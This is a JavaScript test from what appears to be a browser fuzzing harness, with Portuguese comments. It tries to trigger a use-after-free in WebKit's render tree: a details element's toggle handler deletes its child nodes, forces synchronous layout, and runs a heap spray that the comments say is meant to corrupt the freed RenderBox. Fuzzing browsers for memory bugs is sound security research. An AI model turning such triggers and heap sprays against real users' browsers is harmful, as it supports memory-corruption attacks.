
'use strict';
/**
 * Teste 7 — WebCore: DOM/RenderTree lifecycle em HTMLDetailsElement
 *
 * Foco: Disparar um evento síncrono (toggle) em um elemento com Shadow DOM nativo
 * e destruir sua estrutura interna durante o cálculo de layout/rendering,
 * visando UAF na árvore de renderização (RenderObject).
 */
(function (global) {
  global.FuzzerTests = global.FuzzerTests || {};

  global.FuzzerTests['7'] = {
    id      : 7,
    name    : 'WebCore.RenderTree — Details toggle UAF',
    category: 'WebCore-RenderTree-UAF',
    timeout : 5000,

    run: function () {
      var anomalies = [];
      var sandbox = document.createElement('div');
      sandbox.id = 'fuzzer-sandbox-7';
      document.body.appendChild(sandbox);

      (function variantA() {
        try {
          var details = document.createElement('details');
          var summary = document.createElement('summary');
          var child = document.createElement('div');
          
          summary.innerText = 'Trig';
          child.innerText = 'Content';
          
          details.appendChild(summary);
          details.appendChild(child);
          sandbox.appendChild(details);

          var calls = 0;
          details.addEventListener('toggle', function(e) {
            calls++;
            if (calls === 1) {
              /* No exato momento em que o WebKit tenta construir o RenderBox
               * do conteúdo aberto, deletamos os nós do DOM principal. */
              details.removeChild(summary);
              details.removeChild(child);

              /* Força layout síncrono sobre o elemento agora mutilado */
              var rect = details.getBoundingClientRect();
              
              /* Spray de memória para corromper o RenderBox recém-liberado */
              var dummy = [];
              for (var j = 0; j < 200; j++) {
                var arr = new Float64Array(1024);
                arr.fill(3.14159);
                dummy.push(arr);
              }

              /* Validação de anomalias JS-level */
              if (rect.width === undefined || isNaN(rect.width)) {
                 anomalies.push('A: BoundingClientRect retornou valores anômalos após mutilação síncrona');
              }
            }
          });

          /* Mutação síncrona que engatilha o agendamento do evento 'toggle' e do layout */
          details.open = true;

        } catch (e) {
          anomalies.push('A: ' + String(e));
        }
      }());

      document.body.removeChild(sandbox);

      if (anomalies.length > 0) {
        return { status: 'ANOMALY', detail: anomalies.join(' | ') };
      }
      return { status: 'PASS', detail: 'Layout calculation sobreviveu ao teardown interno' };
    }
  };

}(window));
